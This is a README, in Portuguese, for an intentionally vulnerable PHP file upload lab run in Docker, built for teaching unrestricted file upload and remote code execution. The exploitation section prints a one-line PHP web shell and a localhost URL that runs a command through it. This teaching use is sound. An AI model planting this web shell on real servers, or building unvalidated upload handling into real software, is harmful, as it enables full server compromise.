# 📂 Vulnerable File Upload Lab (PHP)

Este repositório contém um **laboratório educacional de segurança web** projetado para demonstrar a vulnerabilidade de **Unrestricted File Upload** em aplicações PHP.

O objetivo deste laboratório é permitir que estudantes de **cibersegurança, pentesters e desenvolvedores** compreendam como implementações inseguras de upload de arquivos podem levar a **Remote Code Execution (RCE)** em servidores web.

O ambiente é executado utilizando **Docker**, permitindo reproduzir facilmente o cenário vulnerável em um ambiente isolado.

---

# 📌 Aviso Legal

> ⚠️ **Uso estritamente educacional**
>
> Este laboratório foi criado **exclusivamente para fins de estudo em cibersegurança** e deve ser utilizado apenas em:
>
> - Ambientes locais de laboratório
> - Máquinas virtuais
> - Ambientes controlados
> - Sistemas com autorização explícita
>
> O uso indevido deste código em sistemas sem permissão pode violar legislações como:
>
> - **Lei Carolina Dieckmann (Lei nº 12.737/2012)**  
> - **Lei Geral de Proteção de Dados – LGPD (Lei nº 13.709/2018)**  
> - Outras legislações de crimes cibernéticos aplicáveis
>
> O autor **não se responsabiliza por qualquer uso indevido** deste material.

---

# 🎯 Objetivo do Laboratório

Demonstrar como aplicações web vulneráveis podem permitir que um atacante:

- Fazer upload de arquivos arbitrários
- Enviar scripts executáveis
- Executar comandos no servidor
- Comprometer completamente a aplicação

A vulnerabilidade explorada neste laboratório é conhecida como:

```
Unrestricted File Upload
```

Impacto potencial:

```
Remote Code Execution (RCE)
```

---

# 🛠️ Tecnologias Utilizadas

Este laboratório utiliza um ambiente simples e reproduzível baseado em:

- **PHP**
- **Apache Web Server**
- **Docker**
- **Docker Compose**

---

# 📁 Estrutura do Projeto

```
file-upload-lab
│
├── app
│   ├── index.php
│   ├── upload.php
│   └── uploads
│
├── Dockerfile
├── docker-compose.yml
│
├── README.md
└── LICENSE
```

Descrição:

| Arquivo | Função |
|------|------|
| `index.php` | Interface de upload de arquivos |
| `upload.php` | Lógica de upload vulnerável |
| `uploads/` | Diretório onde os arquivos são armazenados |
| `Dockerfile` | Configuração do ambiente PHP + Apache |
| `docker-compose.yml` | Orquestração do container |

---

# ⚙️ Como Executar o Laboratório

### 1️⃣ Clonar o repositório

```bash
git clone https://github.com/seuusuario/file-upload-lab.git
cd file-upload-lab
```

---

### 2️⃣ Iniciar o ambiente

```bash
docker compose up -d
```

---

### 3️⃣ Acessar a aplicação

Abra no navegador:

```
http://localhost:8080
```

Você verá a interface de upload de arquivos.

---

# 🧪 Exploração da Vulnerabilidade

Devido à ausência de validação de arquivos, é possível enviar scripts PHP executáveis.

Exemplo de **web shell simples**:

```php
<?php system($_GET['cmd']); ?>
```

Após enviar o arquivo:

```
shell.php
```

Ele poderá ser acessado diretamente:

```
http://localhost:8080/uploads/shell.php?cmd=id
```

Isso permite a execução de comandos no servidor.

---

# 🔐 Problemas de Segurança Demonstrados

Este laboratório demonstra falhas comuns em aplicações web:

- Falta de validação de extensão
- Falta de validação de MIME type
- Upload em diretório público
- Possibilidade de execução de scripts enviados

Essas falhas podem resultar em:

```
Remote Code Execution
Full Server Compromise
```

---

# 📚 Referências

OWASP – Unrestricted File Upload  
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

OWASP Testing Guide  
https://owasp.org/www-project-web-security-testing-guide/

PortSwigger Web Security Academy  
https://portswigger.net/web-security/file-upload

---

# 🚨 AVISO

> Este laboratório é **intencionalmente vulnerável** e foi desenvolvido **exclusivamente para fins educacionais**.

Nunca utilize técnicas aprendidas neste laboratório contra sistemas sem autorização.

---

# 👨‍💻 Autor

**Alexandre Oliveira**  
Cybersecurity Student | Offensive Security  

GitHub:  
https://github.com/AlexandeOliveira12

---

# 📄 Licença

This project is licensed under the **MIT License**.  
See the **LICENSE** file for more details.

Este projeto está licenciado sob a **Licença MIT**.  
Consulte o arquivo **LICENSE** para mais informações.

---

⭐ Se este laboratório foi útil para seus estudos, considere dar um **star no repositório**.